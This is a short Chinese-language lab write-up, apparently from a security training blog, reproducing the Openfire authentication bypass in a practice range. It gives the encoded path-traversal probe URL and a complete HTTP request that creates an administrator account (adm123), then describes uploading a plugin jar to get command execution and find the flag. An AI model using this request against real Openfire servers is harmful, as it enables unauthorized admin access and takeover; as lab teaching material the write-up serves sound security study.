# 原创
：  Openfire 身份认证绕过漏洞复现

# Openfire 身份认证绕过漏洞复现

> 
公众号：掌控安全EDU 分享更多技术文章，欢迎关注一起探讨学习


首先进入靶场访问

https://域名:9090/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp

出现上图所示的日志泄露即可确定漏洞存在<br/> 接下来bp抓包，在重发器里填入以下数据包内容：

```
GET /setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?csrf=xxxxx&amp;username=adm123&amp;name=&amp;email=&amp;password=adm123&amp;passwordConfirm=adm123&amp;isadmin=on&amp;create=%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7 HTTP/1.1
Host: 域名:9090
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.119 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=xxxxx; csrf=xxxxx
Connection: close
```

 <img alt="" height="859" src="https://img-blog.csdnimg.cn/575026de12204902b033748a0ccb2a4c.png" width="1080"/>

发送出现如图的响应即为成功添加用户，账号密码都为adm123(注：JSESSIONID和csrf可以通过访问登录界面来获取)<br/> 登录后台后，去插件那边上传jar包

然后去服务器-服务器设置运行插件，插件密码123回车 

<img alt="" height="684" src="https://img-blog.csdnimg.cn/e492a005ea5743a8a28b1477b55e9596.png" width="1080"/>然后去找flag就好了

**没看够~？欢迎关注！**
